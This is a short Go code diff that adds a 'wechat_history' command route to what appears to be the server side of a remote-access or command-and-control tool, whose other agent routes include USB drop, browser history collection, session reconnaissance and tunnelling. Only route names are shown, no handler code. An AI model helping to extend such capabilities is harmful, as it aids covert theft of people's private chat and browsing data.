@@ -148,6 +148,7 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.POST("/usb_enum", s.handleUSBEnum)
 		agentCmd.POST("/usb_drop", s.handleUSBDrop)
 		agentCmd.POST("/browser_history", s.handleBrowserHistory)
+		agentCmd.POST("/wechat_history", s.handleWeChatHistory)
 		agentCmd.POST("/session_recon", s.handleSessionRecon)
 		agentCmd.POST("/tun/start", s.handleTunStart)
 		agentCmd.POST("/tun/stop", s.handleTunStop)
